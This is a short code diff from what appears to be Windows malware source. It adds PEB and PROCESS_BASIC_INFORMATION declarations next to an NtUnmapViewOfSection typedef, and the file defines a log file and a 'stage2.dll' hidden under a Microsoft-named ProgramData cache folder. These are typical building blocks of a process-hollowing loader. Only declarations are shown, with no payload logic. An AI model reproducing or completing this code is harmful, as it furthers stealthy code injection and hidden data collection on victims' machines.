@@ -1,10 +1,20 @@
 #define _WIN32_WINNT 0x0601
 #include <windows.h>
+#include <psapi.h>
 #include <tlhelp32.h>
 #include <stdio.h>
 
 #define LOG_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\cache.dat"
 #define STAGE2_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\stage2.dll"
+
+typedef struct _PEB *PPEB;
+typedef struct _PROCESS_BASIC_INFORMATION {
+    PVOID Reserved1;
+    PPEB PebBaseAddress;
+    PVOID Reserved2[2];
+    ULONG_PTR UniqueProcessId;
+    PVOID Reserved3;
+} PROCESS_BASIC_INFORMATION;
 
 typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);
 
